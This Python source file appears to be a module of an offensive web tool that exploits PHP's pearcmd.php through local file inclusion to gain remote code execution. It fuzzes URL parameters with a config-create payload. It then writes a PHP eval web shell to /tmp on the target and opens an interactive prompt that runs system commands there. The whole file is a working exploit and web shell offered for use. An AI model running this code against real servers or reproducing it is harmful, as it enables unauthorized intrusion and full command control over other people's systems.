import os
import re
import ssl
import socket
import urllib.parse

import requests
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from rich.progress import Progress
from concurrent.futures import ThreadPoolExecutor

from core.base import BaseChecker, wordlist_path


class PHPPearCmdChecker(BaseChecker):
    def __init__(self, url, silent=False, threads=300):
        super().__init__(url, silent)
        # Override: pearcmd uses raw sockets, keep the original url as-is
        self.url = url
        self.threads = threads
        self.param_name = None
        self.PEARCMD_FILEPATHS = self.load_file_paths(wordlist_path('pearcmd.txt'))

    def load_file_paths(self, filepath):
        file_path = []
        with open(filepath, 'r') as f:
            for line in f:
                file_path.append(line.strip())
        return file_path

    def pearcmd_check(self):
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        file_paths = self.PEARCMD_FILEPATHS
        with Progress(console=self.console) as progress:
            return self._scan(params, file_paths, parsed_url, progress)

    def _send_raw_request(self, url, method='GET', headers=None, use_ssl=False, data=None):
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else (443 if use_ssl else 80)

        request_line = "{} {} HTTP/1.1\r\n".format(method, parsed_url.path + '?' + parsed_url.query)
        headers = headers or {}
        headers['Host'] = host
        headers['User-Agent'] = 'Mozilla/5.0'

        if data is not None:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            headers['Content-Length'] = str(len(data))

        headers['Connection'] = 'closed'
        headers_raw = "".join(["{}: {}\r\n".format(k, v) for k, v in headers.items()])
        request = request_line + headers_raw + "\r\n"

        if data is not None:
            request += data + "\r\n"

        response = None

        for verify_ssl in [True, False]:
            try:
                sock = socket.create_connection((host, port))
                if use_ssl:
                    context = ssl.create_default_context()
                    if not verify_ssl:
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)

                sock.sendall(request.encode())
                response = ""
                while True:
                    data = sock.recv(4096)
                    if data:
                        response += data.decode('utf-8', 'ignore')
                    else:
                        break
                break
            except ssl.SSLError:
                if verify_ssl:
                    continue
                else:
                    self.console.print("\nSSL Error while sending request.")
                    response = None
            except Exception as exc:
                self.console.print(f"\nError while sending request: {exc}")
                response = None
            if response is not None:
                break
        return response

    def _scan(self, params, file_paths, parsed_url, progress=None):
        shared_results = []
        connection_error_count = 0
        stop_signal = False
        print_message = False
        total_tasks = len(params.keys()) * len(file_paths)
        task = progress.add_task("[cyan]Scanning...", total=total_tasks) if progress and not self.silent else None

        def send_request(file_path, param_name):
            nonlocal shared_results, stop_signal, connection_error_count
            if stop_signal:
                return False
            try:
                new_params = params.copy()
                new_params[param_name] = file_path
                payload = '&+config-create+/<?=phpinfo();?>+/tmp/phpinfo'
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                response = requests.get(fuzzed_url, params=payload, verify=False)

                if response and "CHANNEL PEAR.PHP.NET" in response.text:
                    shared_results.append(True)
                    self.file_path = file_path
                    self.param_name = param_name
                    return True
                if progress:
                    progress.update(task, advance=1)
                return False
            except requests.exceptions.ConnectionError:
                connection_error_count += 1
                if connection_error_count >= 10:
                    stop_signal = True
                return False

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(send_request, file_path, param_name)
                       for file_path in file_paths for param_name in params.keys()]

            for future in futures:
                if stop_signal:
                    if connection_error_count >= 10:
                        self.console.print("[bold red]Request Failed (possible WAF block)...[/bold red]")
                    print("Stop signal received, cancelling all futures.")
                    for f in futures:
                        f.cancel()
                    break
                if future.result():
                    stop_signal = True
                    break

        if any(shared_results):
            print_message = True

        if print_message and not self.silent:
            self.console.print('\n[bold red]Possible LFI2RCE (php_pearcmd: method)[/bold red]', style='bold red')

            if any(shared_results):
                self.console.print(f"\n[bold green](using param '{self.param_name}')[/bold green]")

        return any(shared_results), self.param_name

    def run_shell(self, param_name):
        """Custom shell - pearcmd writes a PHP eval shell to /tmp, then POSTs commands."""
        self.silent = True
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        new_params = params.copy()
        depths = ['/', '../' * 10]
        filenames = ['lftest', 'lftest.php']
        new_params[param_name] = f"{self.file_path}&+config-create+/<?=eval($_POST[test]);?>+/tmp/lftest"
        new_query = '&'.join([f'{k}={v}' for k, v in new_params.items()])
        fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
        use_ssl = parsed_url.scheme == "https"
        headers = {'User-Agent': 'Mozilla/5.0'}

        try:
            self._send_raw_request(fuzzed_url, headers=headers, use_ssl=use_ssl)
        except Exception as exc:
            self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
            print(exc)
            return False, None

        for _ in range(2):
            for filename in filenames:
                for depth in depths:
                    new_params[param_name] = f'{depth}tmp/{filename}'
                    new_query = urllib.parse.urlencode(new_params, doseq=True, safe=':+')
                    fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                    data = "test=echo('[S]');echo('[E'.']');"

                    try:
                        response = self._send_raw_request(fuzzed_url, method='POST', headers=headers, use_ssl=use_ssl, data=data)
                        match = re.search(r'\[S\](.*?)\[E\]', response)
                        if match:
                            session = PromptSession(history=InMemoryHistory())
                            while True:
                                try:
                                    cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
                                    if not cmd:
                                        continue
                                    if cmd.strip().lower() in ("exit", "quit"):
                                        raise KeyboardInterrupt
                                    if cmd.strip().lower() in ("clear", "cls"):
                                        os.system("cls" if os.name == "nt" else "clear")
                                        continue

                                    cmd = f"test=echo('[S]');system('{cmd}');echo('[E]');"

                                    attempts = 5
                                    for attempt in range(attempts):
                                        try:
                                            response = requests.post(fuzzed_url, headers=headers, data=cmd, verify=False)
                                        except Exception as exc:
                                            self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
                                            print(exc)

                                        pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
                                        response_content = pattern.search(response.text)
                                        if response_content:
                                            shell_output = response_content.group(1)
                                            self.console.print(f"[bold green]{shell_output}[/bold green]")
                                            break
                                        elif attempt == attempts - 1 and not response_content:
                                            self.console.print("[bold red]No shell output. (Retry because this method is not stable)[/bold red]")

                                except KeyboardInterrupt:
                                    self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
                                    return True, None

                    except Exception as exc:
                        self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
                        print(exc)
                        return False, None
        self.console.print("[bold red]Cannot create the shell :([/bold red]")


def main():
    url = input('Enter site URL to test: ')
    checker = PHPPearCmdChecker(url, silent=True)
    output, param_name = checker.pearcmd_check()

    if output is not None:
        checker.run_shell(param_name)


if __name__ == "__main__":
    main()
